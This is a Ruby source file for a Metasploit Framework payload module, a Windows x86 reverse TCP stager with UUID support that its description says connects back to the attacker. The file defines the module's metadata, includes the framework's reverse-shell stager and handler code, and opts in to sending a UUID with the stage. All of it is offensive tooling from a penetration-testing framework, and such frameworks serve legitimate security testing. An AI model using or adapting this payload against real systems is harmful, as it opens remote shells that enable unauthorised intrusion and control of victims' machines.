##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/reverse_tcp'

module MetasploitModule

  CachedSize = 330

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcp

  def self.handler_type_alias
    'reverse_tcp_uuid'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager with UUID Support',
      'Description' => 'Connect back to the attacker with UUID Support',
      'Author'      => [ 'hdm', 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'sockedi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end

  #
  # Override the uuid function and opt-in for sending the
  # UUID in the stage.
  #
  def include_send_uuid
    true
  end
end
